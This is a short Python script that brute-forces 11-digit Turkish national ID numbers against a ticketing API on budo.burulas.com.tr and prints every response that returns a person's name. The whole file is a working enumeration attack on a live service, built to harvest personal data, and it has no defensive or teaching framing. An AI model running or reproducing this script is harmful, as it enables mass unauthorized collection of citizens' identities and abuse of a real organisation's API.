import requests
import uuid

def go():
    for i in range(10000000000, 99999999999):
        r = requests.post("https://budo.burulas.com.tr/tr/Dynamic/TcRequest", {
            "tcIdentity": i,
            "ticketCategory": str(uuid.uuid4())
        })
        if r.status_code == 200:
            rdata = r.json()
            if rdata.get("Name"):
                print r.text

if __name__ == "__main__":
    go()